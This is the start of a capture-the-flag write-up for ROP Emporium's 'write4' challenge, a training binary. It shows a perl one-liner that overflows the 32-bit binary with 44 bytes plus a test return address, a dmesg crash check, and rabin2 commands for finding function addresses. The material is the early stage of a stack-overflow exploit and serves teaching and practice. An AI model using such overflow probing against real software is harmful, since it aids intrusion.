# write4
The challenge is available [here](https://ropemporium.com/challenge/write4.html).

## Black-Box Test
Like in all the challenges so far, we will also conduct a test now to discover the behavior of the software. Afterwards, we will find that the return address index is the same as in the previous challenges.

```
./write432
```
![](./0.png)
```
perl -e 'print "X"x44 . "\xef\xbe\xad\xde"' | ./write432
```
![](./1.png)
```
sudo dmesg -k | tail -2
```
![](./2.png)

## In-depth research
I assume that anyone reading this solution has already read the instructions for the challenge. We will find the address of the `print_file` function in the next command.

```
rabin2 -i write432
```
![](./3.png)

Additionally, we will also find the address of the regular helper function.

```
rabin2 -qs write432 | grep -ve 'imp' -e ' 0 ' -e '_'
```
![](./4.png)


